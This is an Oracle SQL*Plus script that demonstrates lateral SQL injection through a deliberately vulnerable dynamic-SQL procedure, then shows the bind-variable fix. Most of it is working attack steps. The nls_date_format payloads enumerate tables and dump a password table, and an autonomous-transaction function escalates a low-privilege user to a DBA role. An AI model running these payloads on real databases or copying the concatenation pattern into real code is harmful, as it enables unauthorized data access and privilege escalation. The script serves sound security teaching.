-- SQL injection
-- Injecting malicious code example.

-- Need to first be connected as SYSTEM in your PDB (do not connect to the root container). 

define PDB=high
define system_user=admin
define system_user_pwd=F00bar_F00bar
-- If the DBA role isn't grantable when connected to your PDB, then use the PDB_DBA role.
--define role=DBA
define role=PDB_DBA

conn &&system_user/&&system_user_pwd@&&pdb

-- Be careful with dropping users, make sure you're in a test environment.
-- Drop users if they exist:
drop user pwd_mgr cascade;
drop user dev     cascade;

-- Set a password to be used throughout the script for other users created.
define pwd=F00bar_F00bar

-- Be careful about dropping users.
create user pwd_mgr identified by &&pwd; 

grant &&role to pwd_mgr with admin option;

-- May need this depending on environment. 
grant unlimited tablespace to pwd_mgr;

-- Connect to the user, modify this for your environment.
conn pwd_mgr/&&pwd@&&PDB

create or replace procedure inj( p_date in date )
    as
            l_username   all_users.username%type;
            c            sys_refcursor;
            l_query      varchar2(4000);
    begin
            l_query := '
            select username
              from all_users
             where created = ''' ||p_date ||'''';
 
           dbms_output.put_line( l_query );
           open c for l_query;
 
           for i in 1 .. 5
           loop
                   fetch c into l_username;
                   exit when c%notfound;
                   dbms_output.put_line( l_username || '.....' );
           end loop;
           close c;
   end;
/

set serverout on
exec inj( sysdate )

create table user_pw
   ( uname varchar2(30) primary key,
     pw    varchar2(30));

insert into user_pw   ( uname, pw ) values ( 'TKYTE', 'TOP SECRET' );
commit;

-- Connect as SYSTEM to your PDB here.
conn &&system_user/&&system_user_pwd@&&pdb

create user dev identified by &&pwd; 
grant create session to dev;
grant create procedure to dev;
grant execute on pwd_mgr.inj to dev;

connect dev/&&pwd@&&PDB

alter session set nls_date_format = '"''union select tname from tab--"';
set serverout on
exec pwd_mgr.inj( sysdate )

-- Should see an error here.
select * from pwd_mgr.user_pw;

alter session set nls_date_format = '"''union select tname||''/''||cname from col--"';

exec pwd_mgr.inj( sysdate )

alter session set nls_date_format = '"''union select uname||''/''||pw from user_pw--"';
exec pwd_mgr.inj( sysdate )

create or replace function foo
    return varchar2
    authid CURRENT_USER
    as
            pragma autonomous_transaction;
    begin
            execute immediate 'grant &&role to dev';
            return null;
    end;
/

alter session set nls_date_format = '"''union select dev.foo from dual--"';

grant execute on foo to pwd_mgr;

select * from session_roles;

set serverout on

exec pwd_mgr.inj( sysdate )

conn dev/&&pwd@&&pdb
select * from session_roles;

-- How to protect yourself?

conn pwd_mgr/&&pwd@&&pdb

create or replace procedure NOT_inj( p_date in date )
    as
            l_username   all_users.username%type;
            c            sys_refcursor;
            l_query      varchar2(4000);
    begin
            l_query := '
            select username
              from all_users
            where created = :x';
 
           dbms_output.put_line( l_query );
           open c for l_query USING P_DATE;
 
           for i in 1 .. 5
           loop
                   fetch c into l_username;
                   exit when c%notfound;
                   dbms_output.put_line( l_username || '.....' );
           end loop;
           close c;
   end;
/

PAUSE "How can you protect yourself? Hit RETURN to continue."
set serverout on
alter session set nls_date_format = '"''union select dev.foo from dual--"';

exec NOT_inj(sysdate)
